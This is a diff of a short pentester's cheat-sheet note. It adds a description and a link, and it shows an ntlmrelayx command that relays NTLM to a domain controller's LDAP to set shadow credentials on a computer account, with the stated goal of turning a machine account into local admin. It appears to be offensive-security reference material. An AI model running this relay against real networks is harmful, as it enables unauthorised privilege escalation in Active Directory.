@@ -14,17 +14,22 @@ Search Tag: #📕
 ___
 
 ## Description:  
+To go from machine account to local admin
+
 
 ```bash
 ntlmrelayx.py -t ldap://<dc-ip> --shadow-credentials --shadow-target '<computer-name>$' -smb2support --no-dump --no-da --no-acl --no-validate-privs
 ``````
+
+
+https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay 
 
 ___
 
 ## Resources:
 
 | Hyperlink | Info |
-| https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay | step-by-step |
+|https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay  | step-by-step |
 
 
 Created Date: January 27th 2022 (02:57 pm)  
